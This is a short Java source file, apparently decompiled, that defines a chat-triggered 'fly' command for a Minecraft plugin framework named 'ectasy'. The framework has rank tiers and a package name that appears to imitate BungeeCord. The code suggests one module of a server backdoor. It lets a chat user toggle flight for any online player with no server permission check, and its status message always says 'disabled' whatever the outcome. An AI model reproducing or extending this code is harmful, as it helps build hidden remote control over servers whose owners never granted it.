package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "fly",
   description = "Makes you fly",
   blatant = false,
   rank = Rank.LITE
)
public class FlyCommand extends AbstractCommand {
   public static void doFlyThing(Player var0, Player var1) {
      boolean var2 = !var1.getAllowFlight();
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
         var1.setAllowFlight(var2);
         var1.setFlying(var2);
      });
      ChatUtil.sendChat(var0, "Set fly to " + "§cdisabled");
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         doFlyThing(var1.getPlayer(), var1.getPlayer());
      } else {
         Player var4 = Bukkit.getServer().getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
            return;
         }

         doFlyThing(var1.getPlayer(), var4);
      }
   }
}
